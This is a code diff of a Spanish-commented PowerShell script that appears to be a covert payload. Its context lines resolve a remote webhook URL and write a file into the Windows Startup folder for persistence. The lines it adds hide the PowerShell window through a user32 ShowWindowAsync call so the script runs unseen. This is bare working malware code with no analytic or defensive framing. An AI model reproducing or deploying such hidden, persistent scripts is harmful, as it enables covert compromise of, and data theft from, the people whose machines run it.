@@ -4,6 +4,28 @@ if ($dc.Length -ne 121) {
     $dc = (irm $dc).url
 }
 
+# Crear el objeto Form para mantener PowerShell en segundo plano
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    using System.Windows.Forms;
+"@
+
+$ShowWindowAsync = @"
+    [DllImport("user32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+"@
+
+Add-Type -MemberDefinition $ShowWindowAsync -Name Win32Functions -Namespace API -UsingNamespace System.Windows.Forms
+
+$handle = (Get-Process -PID $PID).MainWindowHandle
+[API.Win32Functions]::ShowWindowAsync($handle, 0)
+
+# Resto del script
+$seconds = 30
+$a = 1
+
 # Crear el archivo de inicio
 $startupFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
 $wshShellCreation = "Set WshShell = WScript.CreateObject('WScript.Shell')"
